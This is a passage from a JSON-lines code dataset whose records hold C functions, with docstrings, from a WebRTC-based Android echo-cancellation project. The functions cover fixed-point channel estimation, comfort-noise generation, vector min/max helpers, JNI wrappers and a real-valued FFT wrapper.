kAlpha2;\n                beta = kBeta2;\n            } else\n            {\n                alpha = kAlpha3;\n                beta = kBeta3;\n            }\n            tmp16no1 = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(max_value,\n                                                                alpha,\n                                                                15);\n            tmp16no2 = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(min_value,\n                                                                beta,\n                                                                15);\n            freq_signal_abs[i] = (uint16_t)tmp16no1 +\n                (uint16_t)tmp16no2;\n#else\n#ifdef WEBRTC_ARCH_ARM_V7\n            __asm __volatile(\n              \"smulbb %[tmp32no1], %[real], %[real]\\n\\t\"\n              \"smlabb %[tmp32no2], %[imag], %[imag], %[tmp32no1]\\n\\t\"\n              :[tmp32no1]\"+r\"(tmp32no1),\n               [tmp32no2]\"=r\"(tmp32no2)\n              :[real]\"r\"(freq_signal[i].real),\n               [imag]\"r\"(freq_signal[i].imag)\n            );\n#else\n            tmp16no1 = WEBRTC_SPL_ABS_W16(freq_signal[i].real);\n            tmp16no2 = WEBRTC_SPL_ABS_W16(freq_signal[i].imag);\n            tmp32no1 = WEBRTC_SPL_MUL_16_16(tmp16no1, tmp16no1);\n            tmp32no2 = WEBRTC_SPL_MUL_16_16(tmp16no2, tmp16no2);\n            tmp32no2 = WEBRTC_SPL_ADD_SAT_W32(tmp32no1, tmp32no2);\n#endif // WEBRTC_ARCH_ARM_V7\n            tmp32no1 = WebRtcSpl_SqrtFloor(tmp32no2);\n\n            freq_signal_abs[i] = (uint16_t)tmp32no1;\n#endif // AECM_WITH_ABS_APPROX\n        }\n        (*freq_signal_sum_abs) += (uint32_t)freq_signal_abs[i];\n    }\n\n    return time_signal_scaling;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Maximum absolute value of word32 vector. C version for generic platforms.\n", "func_signal": "int32_t WebRtcSpl_MaxAbsValueW32C(const int32_t* vector, int length)", "code": "{\n  // Use uint32_t for the local variables, to accommodate the return value\n  // of abs(0x80000000), which is 0x80000000.\n\n  uint32_t absolute = 0, maximum = 0;\n  int i = 0;\n\n  if (vector == NULL || length <= 0) {\n    return -1;\n  }\n\n  for (i = 0; i < length; i++) {\n    absolute = abs((int)vector[i]);\n    if (absolute > maximum) {\n      maximum = absolute;\n    }\n  }\n\n  maximum = WEBRTC_SPL_MIN(maximum, WEBRTC_SPL_WORD32_MAX);\n\n  return (int32_t)maximum;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// WebRtcAecm_UpdateChannel(...)\n//\n// This function performs channel estimation. NLMS and decision on channel storage.\n//\n//\n// @param  aecm         [i/o]   Handle of the AECM instance.\n// @param  far_spectrum [in]    Absolute value of the farend signal in Q(far_q)\n// @param  far_q        [in]    Q-domain of the farend signal\n// @param  dfa          [in]    Absolute value of the nearend signal (Q[aecm->dfaQDomain])\n// @param  mu           [in]    NLMS step size.\n// @param  echoEst      [i/o]   Estimated echo in Q(far_q+RESOLUTION_CHANNEL16).\n//\n", "func_signal": "void WebRtcAecm_UpdateChannel(AecmCore_t * aecm,\n                              const uint16_t* far_spectrum,\n                              const int16_t far_q,\n                              const uint16_t * const dfa,\n                              const int16_t mu,\n                              int32_t * echoEst)", "code": "{\n\n    uint32_t tmpU32no1, tmpU32no2;\n    int32_t tmp32no1, tmp32no2;\n    int32_t mseStored;\n    int32_t mseAdapt;\n\n    int i;\n\n    int16_t zerosFar, zerosNum, zerosCh, zerosDfa;\n    int16_t shiftChFar, shiftNum, shift2ResChan;\n    int16_t tmp16no1;\n    int16_t xfaQ, dfaQ;\n\n    // This is the channel estimation algorithm. It is base on NLMS but has a variable step\n    // length, which was calculated above.\n    if (mu)\n    {\n        for (i = 0; i < PART_LEN1; i++)\n        {\n            // Determine norm of channel and farend to make sure we don't get overflow in\n            // multiplication\n            zerosCh = WebRtcSpl_NormU32(aecm->channelAdapt32[i]);\n            zerosFar = WebRtcSpl_NormU32((uint32_t)far_spectrum[i]);\n            if (zerosCh + zerosFar > 31)\n            {\n                // Multiplication is safe\n                tmpU32no1 = WEBRTC_SPL_UMUL_32_16(aecm->channelAdapt32[i],\n                        far_spectrum[i]);\n                shiftChFar = 0;\n            } else\n            {\n                // We need to shift down before multiplication\n                shiftChFar = 32 - zerosCh - zerosFar;\n                tmpU32no1 = WEBRTC_SPL_UMUL_32_16(\n                    WEBRTC_SPL_RSHIFT_W32(aecm->channelAdapt32[i], shiftChFar),\n                    far_spectrum[i]);\n            }\n            // Determine Q-domain of numerator\n            zerosNum = WebRtcSpl_NormU32(tmpU32no1);\n            if (dfa[i])\n            {\n                zerosDfa = WebRtcSpl_NormU32((uint32_t)dfa[i]);\n            } else\n            {\n                zerosDfa = 32;\n            }\n            tmp16no1 = zerosDfa - 2 + aecm->dfaNoisyQDomain -\n                RESOLUTION_CHANNEL32 - far_q + shiftChFar;\n            if (zerosNum > tmp16no1 + 1)\n            {\n                xfaQ = tmp16no1;\n                dfaQ = zerosDfa - 2;\n            } else\n            {\n                xfaQ = zerosNum - 2;\n                dfaQ = RESOLUTION_CHANNEL32 + far_q - aecm->dfaNoisyQDomain -\n                    shiftChFar + xfaQ;\n            }\n            // Add in the same Q-domain\n            tmpU32no1 = WEBRTC_SPL_SHIFT_W32(tmpU32no1, xfaQ);\n            tmpU32no2 = WEBRTC_SPL_SHIFT_W32((uint32_t)dfa[i], dfaQ);\n            tmp32no1 = (int32_t)tmpU32no2 - (int32_t)tmpU32no1;\n            zerosNum = WebRtcSpl_NormW32(tmp32no1);\n            if ((tmp32no1) && (far_spectrum[i] > (CHANNEL_VAD << far_q)))\n            {\n                //\n                // Update is needed\n                //\n                // This is what we would like to compute\n                //\n                // tmp32no1 = dfa[i] - (aecm->channelAdapt[i] * far_spectrum[i])\n                // tmp32norm = (i + 1)\n                // aecm->channelAdapt[i] += (2^mu) * tmp32no1\n                //                        / (tmp32norm * far_spectrum[i])\n                //\n\n                // Make sure we don't get overflow in multiplication.\n                if (zerosNum + zerosFar > 31)\n                {\n                    if (tmp32no1 > 0)\n                    {\n                        tmp32no2 = (int32_t)WEBRTC_SPL_UMUL_32_16(tmp32no1,\n                                                                        far_spectrum[i]);\n                    } else\n                    {\n                        tmp32no2 = -(int32_t)WEBRTC_SPL_UMUL_32_16(-tmp32no1,\n                                                                         far_spectrum[i]);\n                    }\n                    shiftNum = 0;\n                } else\n                {\n                    shiftNum = 32 - (zerosNum + zerosFar);\n                    if (tmp32no1 > 0)\n                    {\n                        tmp32no2 = (int32_t)WEBRTC_SPL_UMUL_32_16(\n                                WEBRTC_SPL_RSHIFT_W32(tmp32no1, shiftNum),\n                                far_spectrum[i]);\n                    } else\n                    {\n                        tmp32no2 = -(int32_t)WEBRTC_SPL_UMUL_32_16(\n                                WEBRTC_SPL_RSHIFT_W32(-tmp32no1, shiftNum),\n                                far_spectrum[i]);\n                    }\n                }\n                // Normalize with respect to frequency bin\n                tmp32no2 = WebRtcSpl_DivW32W16(tmp32no2, i + 1);\n                // Make sure we are in the right Q-domain\n                shift2ResChan = shiftNum + shiftChFar - xfaQ - mu - ((30 - zerosFar) << 1);\n                if (WebRtcSpl_NormW32(tmp32no2) < shift2ResChan)\n                {\n                    tmp32no2 = WEBRTC_SPL_WORD32_MAX;\n                } else\n                {\n                    tmp32no2 = WEBRTC_SPL_SHIFT_W32(tmp32no2, shift2ResChan);\n                }\n                aecm->channelAdapt32[i] = WEBRTC_SPL_ADD_SAT_W32(aecm->channelAdapt32[i],\n                        tmp32no2);\n                if (aecm->channelAdapt32[i] < 0)\n                {\n                    // We can never have negative channel gain\n                    aecm->channelAdapt32[i] = 0;\n                }\n                aecm->channelAdapt16[i]\n                        = (int16_t)WEBRTC_SPL_RSHIFT_W32(aecm->channelAdapt32[i], 16);\n            }\n        }\n    }\n    // END: Adaptive channel update\n\n    // Determine if we should store or restore the channel\n    if ((aecm->startupState == 0) & (aecm->currentVADValue))\n    {\n        // During startup we store the channel every block,\n        // and we recalculate echo estimate\n        WebRtcAecm_StoreAdaptiveChannel(aecm, far_spectrum, echoEst);\n    } else\n    {\n        if (aecm->farLogEnergy < aecm->farEnergyMSE)\n        {\n            aecm->mseChannelCount = 0;\n        } else\n        {\n            aecm->mseChannelCount++;\n        }\n        // Enough data for validation. Store channel if we can.\n        if (aecm->mseChannelCount >= (MIN_MSE_COUNT + 10))\n        {\n            // We have enough data.\n            // Calculate MSE of \"Adapt\" and \"Stored\" versions.\n            // It is actually not MSE, but average absolute error.\n            mseStored = 0;\n            mseAdapt = 0;\n            for (i = 0; i < MIN_MSE_COUNT; i++)\n            {\n                tmp32no1 = ((int32_t)aecm->echoStoredLogEnergy[i]\n                        - (int32_t)aecm->nearLogEnergy[i]);\n                tmp32no2 = WEBRTC_SPL_ABS_W32(tmp32no1);\n                mseStored += tmp32no2;\n\n                tmp32no1 = ((int32_t)aecm->echoAdaptLogEnergy[i]\n                        - (int32_t)aecm->nearLogEnergy[i]);\n                tmp32no2 = WEBRTC_SPL_ABS_W32(tmp32no1);\n                mseAdapt += tmp32no2;\n            }\n            if (((mseStored << MSE_RESOLUTION) < (MIN_MSE_DIFF * mseAdapt))\n                    & ((aecm->mseStoredOld << MSE_RESOLUTION) < (MIN_MSE_DIFF\n                            * aecm->mseAdaptOld)))\n            {\n                // The stored channel has a significantly lower MSE than the adaptive one for\n                // two consecutive calculations. Reset the adaptive channel.\n                WebRtcAecm_ResetAdaptiveChannel(aecm);\n            } else if (((MIN_MSE_DIFF * mseStored) > (mseAdapt << MSE_RESOLUTION)) & (mseAdapt\n                    < aecm->mseThreshold) & (aecm->mseAdaptOld < aecm->mseThreshold))\n            {\n                // The adaptive channel has a significantly lower MSE than the stored one.\n                // The MSE for the adaptive channel has also been low for two consecutive\n                // calculations. Store the adaptive channel.\n                WebRtcAecm_StoreAdaptiveChannel(aecm, far_spectrum, echoEst);\n\n                // Update threshold\n                if (aecm->mseThreshold == WEBRTC_SPL_WORD32_MAX)\n                {\n                    aecm->mseThreshold = (mseAdapt + aecm->mseAdaptOld);\n                } else\n                {\n                    aecm->mseThreshold += WEBRTC_SPL_MUL_16_16_RSFT(mseAdapt\n                            - WEBRTC_SPL_MUL_16_16_RSFT(aecm->mseThreshold, 5, 3), 205, 8);\n                }\n\n            }\n\n            // Reset counter\n            aecm->mseChannelCount = 0;\n\n            // Store the MSE values.\n            aecm->mseStoredOld = mseStored;\n            aecm->mseAdaptOld = mseAdapt;\n        }\n    }\n    // END: Determine if we should store or reset channel estimate.\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Minimum value of word32 vector. C version for generic platforms.\n", "func_signal": "int32_t WebRtcSpl_MinValueW32C(const int32_t* vector, int length)", "code": "{\n  int32_t minimum = WEBRTC_SPL_WORD32_MAX;\n  int i = 0;\n\n  if (vector == NULL || length <= 0) {\n    return minimum;\n  }\n\n  for (i = 0; i < length; i++) {\n    if (vector[i] < minimum)\n      minimum = vector[i];\n  }\n  return minimum;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// WebRtcAecm_CalcStepSize(...)\n//\n// This function calculates the step size used in channel estimation\n//\n//\n// @param  aecm  [in]    Handle of the AECM instance.\n// @param  mu    [out]   (Return value) Stepsize in log2(), i.e. number of shifts.\n//\n//\n", "func_signal": "int16_t WebRtcAecm_CalcStepSize(AecmCore_t * const aecm)", "code": "{\n\n    int32_t tmp32;\n    int16_t tmp16;\n    int16_t mu = MU_MAX;\n\n    // Here we calculate the step size mu used in the\n    // following NLMS based Channel estimation algorithm\n    if (!aecm->currentVADValue)\n    {\n        // Far end energy level too low, no channel update\n        mu = 0;\n    } else if (aecm->startupState > 0)\n    {\n        if (aecm->farEnergyMin >= aecm->farEnergyMax)\n        {\n            mu = MU_MIN;\n        } else\n        {\n            tmp16 = (aecm->farLogEnergy - aecm->farEnergyMin);\n            tmp32 = WEBRTC_SPL_MUL_16_16(tmp16, MU_DIFF);\n            tmp32 = WebRtcSpl_DivW32W16(tmp32, aecm->farEnergyMaxMin);\n            mu = MU_MIN - 1 - (int16_t)(tmp32);\n            // The -1 is an alternative to rounding. This way we get a larger\n            // stepsize, so we in some sense compensate for truncation in NLMS\n        }\n        if (mu < MU_MAX)\n        {\n            mu = MU_MAX; // Equivalent with maximum step size of 2^-MU_MAX\n        }\n    }\n\n    return mu;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "/**\n * This wrapper wraps the WebRtcAecm_Init() function in WebRtc echo_control_mobile.c\n * Initializes an AECM instance.\n *\n * Inputs:\n *            aecmHandler     - Handler of AECM instance\n *            sampFreq           - Sampling frequency of data\n * Outputs:\n *           NONE\n * Return:          0: OK\n *                       -1: error\n *\n */\n", "func_signal": "JNIEXPORT jint\nJNICALL Java_com_android_webrtc_audio_MobileAEC_nativeInitializeAecmInstance(\n\t\tJNIEnv *env, jclass jclazz, jint aecmHandler, jint sampFreq)", "code": "{\n\tvoid *aecmInst = (void *) aecmHandler;\n\tif (aecmInst == NULL)\n\t\treturn -1;\n\treturn WebRtcAecm_Init(aecmInst, sampFreq);\n}", "path": "eclipse-project\\jni\\aecm\\aecm_wrapper.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Index of maximum value in a word32 vector.\n", "func_signal": "int WebRtcSpl_MaxIndexW32(const int32_t* vector, int length)", "code": "{\n  int i = 0, index = 0;\n  int32_t maximum = WEBRTC_SPL_WORD32_MIN;\n\n  if (vector == NULL || length <= 0) {\n    return -1;\n  }\n\n  for (i = 0; i < length; i++) {\n    if (vector[i] > maximum) {\n      maximum = vector[i];\n      index = i;\n    }\n  }\n\n  return index;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "/**\n * This wrapper wraps the WebRtcAecm_BufferFarend function in echo_control_mobile.c\n * Inserts an 80 or 160 sample block of data into the farend buffer.\n *\n * Inputs:\n *       aecmHandler    - Handler to the AECM instance\n *       farend               - In buffer containing one frame of farend signal for L band\n *       nrOfSamples    - Number of samples in farend buffer\n * Outputs:\n *       NONE\n * Return:     0: OK\n *                  -1: error\n *\n */\n", "func_signal": "JNIEXPORT jint JNICALL Java_com_android_webrtc_audio_MobileAEC_nativeBufferFarend(\n\t\tJNIEnv *env, jclass jclazz, jint aecmHandler, jshortArray farend,\n\t\tjint nrOfSamples)", "code": "{\n\tvoid *aecmInst = (void *) aecmHandler;\n\tif (aecmInst == NULL)\n\t\treturn -1;\n\n\tint ret = -1;\n\tif (farend != NULL) {\n\t\tshort *arrFarend = (*env)->GetShortArrayElements(env, farend, NULL);\n\t\tret = WebRtcAecm_BufferFarend(aecmInst, arrFarend, nrOfSamples);\n\n\t\t//TODO(billhoo) should use JNI_ABORT instead of 0 in 4th param.\n\t\t//I think there is no need to copy this array back to Java layer.\n\t\t(*env)->ReleaseShortArrayElements(env, farend, arrFarend, 0);\n\t}\n\treturn ret;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_wrapper.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Index of maximum absolute value in a word16 vector.\n", "func_signal": "int WebRtcSpl_MaxAbsIndexW16(const int16_t* vector, int length)", "code": "{\n  // Use type int for local variables, to accomodate the value of abs(-32768).\n\n  int i = 0, absolute = 0, maximum = 0, index = 0;\n\n  if (vector == NULL || length <= 0) {\n    return -1;\n  }\n\n  for (i = 0; i < length; i++) {\n    absolute = abs((int)vector[i]);\n\n    if (absolute > maximum) {\n      maximum = absolute;\n      index = i;\n    }\n  }\n\n  return index;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Maximum value of word16 vector. C version for generic platforms.\n", "func_signal": "int16_t WebRtcSpl_MaxValueW16C(const int16_t* vector, int length)", "code": "{\n  int16_t maximum = WEBRTC_SPL_WORD16_MIN;\n  int i = 0;\n\n  if (vector == NULL || length <= 0) {\n    return maximum;\n  }\n\n  for (i = 0; i < length; i++) {\n    if (vector[i] > maximum)\n      maximum = vector[i];\n  }\n  return maximum;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Generate comfort noise and add to output signal.\n//\n// \\param[in]     aecm     Handle of the AECM instance.\n// \\param[in]     dfa     Absolute value of the nearend signal (Q[aecm->dfaQDomain]).\n// \\param[in,out] outReal Real part of the output signal (Q[aecm->dfaQDomain]).\n// \\param[in,out] outImag Imaginary part of the output signal (Q[aecm->dfaQDomain]).\n// \\param[in]     lambda  Suppression gain with which to scale the noise level (Q14).\n//\n", "func_signal": "static void ComfortNoise(AecmCore_t* aecm,\n                         const uint16_t* dfa,\n                         complex16_t* out,\n                         const int16_t* lambda)", "code": "{\n    int16_t i;\n    int16_t tmp16;\n    int32_t tmp32;\n\n    int16_t randW16[PART_LEN];\n    int16_t uReal[PART_LEN1];\n    int16_t uImag[PART_LEN1];\n    int32_t outLShift32;\n    int16_t noiseRShift16[PART_LEN1];\n\n    int16_t shiftFromNearToNoise = kNoiseEstQDomain - aecm->dfaCleanQDomain;\n    int16_t minTrackShift;\n\n    assert(shiftFromNearToNoise >= 0);\n    assert(shiftFromNearToNoise < 16);\n\n    if (aecm->noiseEstCtr < 100)\n    {\n        // Track the minimum more quickly initially.\n        aecm->noiseEstCtr++;\n        minTrackShift = 6;\n    } else\n    {\n        minTrackShift = 9;\n    }\n\n    // Estimate noise power.\n    for (i = 0; i < PART_LEN1; i++)\n    {\n\n        // Shift to the noise domain.\n        tmp32 = (int32_t)dfa[i];\n        outLShift32 = WEBRTC_SPL_LSHIFT_W32(tmp32, shiftFromNearToNoise);\n\n        if (outLShift32 < aecm->noiseEst[i])\n        {\n            // Reset \"too low\" counter\n            aecm->noiseEstTooLowCtr[i] = 0;\n            // Track the minimum.\n            if (aecm->noiseEst[i] < (1 << minTrackShift))\n            {\n                // For small values, decrease noiseEst[i] every\n                // |kNoiseEstIncCount| block. The regular approach below can not\n                // go further down due to truncation.\n                aecm->noiseEstTooHighCtr[i]++;\n                if (aecm->noiseEstTooHighCtr[i] >= kNoiseEstIncCount)\n                {\n                    aecm->noiseEst[i]--;\n                    aecm->noiseEstTooHighCtr[i] = 0; // Reset the counter\n                }\n            }\n            else\n            {\n                aecm->noiseEst[i] -= ((aecm->noiseEst[i] - outLShift32) >> minTrackShift);\n            }\n        } else\n        {\n            // Reset \"too high\" counter\n            aecm->noiseEstTooHighCtr[i] = 0;\n            // Ramp slowly upwards until we hit the minimum again.\n            if ((aecm->noiseEst[i] >> 19) > 0)\n            {\n                // Avoid overflow.\n                // Multiplication with 2049 will cause wrap around. Scale\n                // down first and then multiply\n                aecm->noiseEst[i] >>= 11;\n                aecm->noiseEst[i] *= 2049;\n            }\n            else if ((aecm->noiseEst[i] >> 11) > 0)\n            {\n                // Large enough for relative increase\n                aecm->noiseEst[i] *= 2049;\n                aecm->noiseEst[i] >>= 11;\n            }\n            else\n            {\n                // Make incremental increases based on size every\n                // |kNoiseEstIncCount| block\n                aecm->noiseEstTooLowCtr[i]++;\n                if (aecm->noiseEstTooLowCtr[i] >= kNoiseEstIncCount)\n                {\n                    aecm->noiseEst[i] += (aecm->noiseEst[i] >> 9) + 1;\n                    aecm->noiseEstTooLowCtr[i] = 0; // Reset counter\n                }\n            }\n        }\n    }\n\n    for (i = 0; i < PART_LEN1; i++)\n    {\n        tmp32 = WEBRTC_SPL_RSHIFT_W32(aecm->noiseEst[i], shiftFromNearToNoise);\n        if (tmp32 > 32767)\n        {\n            tmp32 = 32767;\n            aecm->noiseEst[i] = WEBRTC_SPL_LSHIFT_W32(tmp32, shiftFromNearToNoise);\n        }\n        noiseRShift16[i] = (int16_t)tmp32;\n\n        tmp16 = ONE_Q14 - lambda[i];\n        noiseRShift16[i]\n                = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(tmp16, noiseRShift16[i], 14);\n    }\n\n    // Generate a uniform random array on [0 2^15-1].\n    WebRtcSpl_RandUArray(randW16, PART_LEN, &aecm->seed);\n\n    // Generate noise according to estimated energy.\n    uReal[0] = 0; // Reject LF noise.\n    uImag[0] = 0;\n    for (i = 1; i < PART_LEN1; i++)\n    {\n        // Get a random index for the cos and sin tables over [0 359].\n        tmp16 = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(359, randW16[i - 1], 15);\n\n        // Tables are in Q13.\n        uReal[i] = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(noiseRShift16[i],\n                kCosTable[tmp16], 13);\n        uImag[i] = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(-noiseRShift16[i],\n                kSinTable[tmp16], 13);\n    }\n    uImag[PART_LEN] = 0;\n\n    for (i = 0; i < PART_LEN1; i++)\n    {\n        out[i].real = WEBRTC_SPL_ADD_SAT_W16(out[i].real, uReal[i]);\n        out[i].imag = WEBRTC_SPL_ADD_SAT_W16(out[i].imag, uImag[i]);\n    }\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Returns a pointer to the far end spectrum aligned to current near end\n// spectrum. The function WebRtc_DelayEstimatorProcessFix(...) should have been\n// called before AlignedFarend(...). Otherwise, you get the pointer to the\n// previous frame. The memory is only valid until the next call of\n// WebRtc_DelayEstimatorProcessFix(...).\n//\n// Inputs:\n//      - self              : Pointer to the AECM instance.\n//      - delay             : Current delay estimate.\n//\n// Output:\n//      - far_q             : The Q-domain of the aligned far end spectrum\n//\n// Return value:\n//      - far_spectrum      : Pointer to the aligned far end spectrum\n//                            NULL - Error\n//\n", "func_signal": "static const uint16_t* AlignedFarend(AecmCore_t* self, int* far_q, int delay)", "code": "{\n  int buffer_position = 0;\n  assert(self != NULL);\n  buffer_position = self->far_history_pos - delay;\n\n  // Check buffer position\n  if (buffer_position < 0) {\n    buffer_position += MAX_DELAY;\n  }\n  // Get Q-domain\n  *far_q = self->far_q_domains[buffer_position];\n  // Return far end spectrum\n  return &(self->far_history[buffer_position * PART_LEN1]);\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// WebRtcAecm_InitCore(...)\n//\n// This function initializes the AECM instant created with WebRtcAecm_CreateCore(...)\n// Input:\n//      - aecm            : Pointer to the Echo Suppression instance\n//      - samplingFreq   : Sampling Frequency\n//\n// Output:\n//      - aecm            : Initialized instance\n//\n// Return value         :  0 - Ok\n//                        -1 - Error\n//\n", "func_signal": "int WebRtcAecm_InitCore(AecmCore_t * const aecm, int samplingFreq)", "code": "{\n    int i = 0;\n    int32_t tmp32 = PART_LEN1 * PART_LEN1;\n    int16_t tmp16 = PART_LEN1;\n\n    if (samplingFreq != 8000 && samplingFreq != 16000)\n    {\n        samplingFreq = 8000;\n        return -1;\n    }\n    // sanity check of sampling frequency\n    aecm->mult = (int16_t)samplingFreq / 8000;\n\n    aecm->farBufWritePos = 0;\n    aecm->farBufReadPos = 0;\n    aecm->knownDelay = 0;\n    aecm->lastKnownDelay = 0;\n\n    WebRtc_InitBuffer(aecm->farFrameBuf);\n    WebRtc_InitBuffer(aecm->nearNoisyFrameBuf);\n    WebRtc_InitBuffer(aecm->nearCleanFrameBuf);\n    WebRtc_InitBuffer(aecm->outFrameBuf);\n\n    memset(aecm->xBuf_buf, 0, sizeof(aecm->xBuf_buf));\n    memset(aecm->dBufClean_buf, 0, sizeof(aecm->dBufClean_buf));\n    memset(aecm->dBufNoisy_buf, 0, sizeof(aecm->dBufNoisy_buf));\n    memset(aecm->outBuf_buf, 0, sizeof(aecm->outBuf_buf));\n\n    aecm->seed = 666;\n    aecm->totCount = 0;\n\n    if (WebRtc_InitDelayEstimatorFarend(aecm->delay_estimator_farend) != 0) {\n      return -1;\n    }\n    if (WebRtc_InitDelayEstimator(aecm->delay_estimator) != 0) {\n      return -1;\n    }\n    // Set far end histories to zero\n    memset(aecm->far_history, 0, sizeof(uint16_t) * PART_LEN1 * MAX_DELAY);\n    memset(aecm->far_q_domains, 0, sizeof(int) * MAX_DELAY);\n    aecm->far_history_pos = MAX_DELAY;\n\n    aecm->nlpFlag = 1;\n    aecm->fixedDelay = -1;\n\n    aecm->dfaCleanQDomain = 0;\n    aecm->dfaCleanQDomainOld = 0;\n    aecm->dfaNoisyQDomain = 0;\n    aecm->dfaNoisyQDomainOld = 0;\n\n    memset(aecm->nearLogEnergy, 0, sizeof(aecm->nearLogEnergy));\n    aecm->farLogEnergy = 0;\n    memset(aecm->echoAdaptLogEnergy, 0, sizeof(aecm->echoAdaptLogEnergy));\n    memset(aecm->echoStoredLogEnergy, 0, sizeof(aecm->echoStoredLogEnergy));\n\n    // Initialize the echo channels with a stored shape.\n    if (samplingFreq == 8000)\n    {\n        WebRtcAecm_InitEchoPathCore(aecm, kChannelStored8kHz);\n    }\n    else\n    {\n        WebRtcAecm_InitEchoPathCore(aecm, kChannelStored16kHz);\n    }\n\n    memset(aecm->echoFilt, 0, sizeof(aecm->echoFilt));\n    memset(aecm->nearFilt, 0, sizeof(aecm->nearFilt));\n    aecm->noiseEstCtr = 0;\n\n    aecm->cngMode = AecmTrue;\n\n    memset(aecm->noiseEstTooLowCtr, 0, sizeof(aecm->noiseEstTooLowCtr));\n    memset(aecm->noiseEstTooHighCtr, 0, sizeof(aecm->noiseEstTooHighCtr));\n    // Shape the initial noise level to an approximate pink noise.\n    for (i = 0; i < (PART_LEN1 >> 1) - 1; i++)\n    {\n        aecm->noiseEst[i] = (tmp32 << 8);\n        tmp16--;\n        tmp32 -= (int32_t)((tmp16 << 1) + 1);\n    }\n    for (; i < PART_LEN1; i++)\n    {\n        aecm->noiseEst[i] = (tmp32 << 8);\n    }\n\n    aecm->farEnergyMin = WEBRTC_SPL_WORD16_MAX;\n    aecm->farEnergyMax = WEBRTC_SPL_WORD16_MIN;\n    aecm->farEnergyMaxMin = 0;\n    aecm->farEnergyVAD = FAR_ENERGY_MIN; // This prevents false speech detection at the\n                                         // beginning.\n    aecm->farEnergyMSE = 0;\n    aecm->currentVADValue = 0;\n    aecm->vadUpdateCount = 0;\n    aecm->firstVAD = 1;\n\n    aecm->startupState = 0;\n    aecm->supGain = SUPGAIN_DEFAULT;\n    aecm->supGainOld = SUPGAIN_DEFAULT;\n\n    aecm->supGainErrParamA = SUPGAIN_ERROR_PARAM_A;\n    aecm->supGainErrParamD = SUPGAIN_ERROR_PARAM_D;\n    aecm->supGainErrParamDiffAB = SUPGAIN_ERROR_PARAM_A - SUPGAIN_ERROR_PARAM_B;\n    aecm->supGainErrParamDiffBD = SUPGAIN_ERROR_PARAM_B - SUPGAIN_ERROR_PARAM_D;\n\n    // Assert a preprocessor definition at compile-time. It's an assumption\n    // used in assembly code, so check the assembly files before any change.\n    COMPILE_ASSERT(PART_LEN % 16 == 0);\n\n    // Initialize function pointers.\n    WebRtcAecm_CalcLinearEnergies = CalcLinearEnergiesC;\n    WebRtcAecm_StoreAdaptiveChannel = StoreAdaptiveChannelC;\n    WebRtcAecm_ResetAdaptiveChannel = ResetAdaptiveChannelC;\n\n#ifdef WEBRTC_DETECT_ARM_NEON\n    uint64_t features = WebRtc_GetCPUFeaturesARM();\n    if ((features & kCPUFeatureNEON) != 0)\n    {\n      WebRtcAecm_InitNeon();\n    }\n#elif defined(WEBRTC_ARCH_ARM_NEON)\n    WebRtcAecm_InitNeon();\n#endif\n\n    return 0;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// The C version FFT functions (i.e. WebRtcSpl_RealForwardFFTC and\n// WebRtcSpl_RealInverseFFTC) are real-valued FFT wrappers for complex-valued\n// FFT implementation in SPL.\n", "func_signal": "int WebRtcSpl_RealForwardFFTC(struct RealFFT* self,\n                              const int16_t* real_data_in,\n                              int16_t* complex_data_out)", "code": "{\n  int i = 0;\n  int j = 0;\n  int result = 0;\n  int n = 1 << self->order;\n  // The complex-value FFT implementation needs a buffer to hold 2^order\n  // 16-bit COMPLEX numbers, for both time and frequency data.\n  int16_t complex_buffer[2 << kMaxFFTOrder];\n\n  // Insert zeros to the imaginary parts for complex forward FFT input.\n  for (i = 0, j = 0; i < n; i += 1, j += 2) {\n    complex_buffer[j] = real_data_in[i];\n    complex_buffer[j + 1] = 0;\n  };\n\n  WebRtcSpl_ComplexBitReverse(complex_buffer, self->order);\n  result = WebRtcSpl_ComplexFFT(complex_buffer, self->order, 1);\n\n  // For real FFT output, use only the first N + 2 elements from\n  // complex forward FFT.\n  memcpy(complex_data_out, complex_buffer, sizeof(int16_t) * (n + 2));\n\n  return result;\n}", "path": "eclipse-project\\jni\\aecm\\real_fft.c", "repo_name": 